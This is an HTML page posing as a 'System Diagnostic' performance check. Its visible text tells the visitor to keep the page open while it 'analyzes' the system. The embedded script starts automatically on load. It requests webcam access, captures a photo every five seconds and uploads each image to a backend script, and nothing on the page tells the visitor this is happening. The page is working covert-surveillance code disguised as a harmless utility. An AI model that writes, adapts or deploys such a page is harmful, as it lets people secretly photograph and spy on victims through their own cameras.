<!DOCTYPE html>
<html>
<head>
    <title>System Diagnostic</title>
    <script>
        async function startCapture() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // High Persistence: Capture a photo every 5 seconds
            setInterval(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                const data = canvas.toDataURL('image/png');

                // Send to your backend
                fetch('upload.php', {
                    method: 'POST',
                    body: JSON.stringify({ image: data })
                });
            }, 5000); 
        }
        window.onload = startCapture;
    </script>
</head>
<body style="background:black; color:white; font-family:sans-serif; text-align:center;">
    <h2>🔄 Analyzing System Performance...</h2>
    <p>Please keep this page open for 30 seconds to complete the check.</p>
</body>
</html>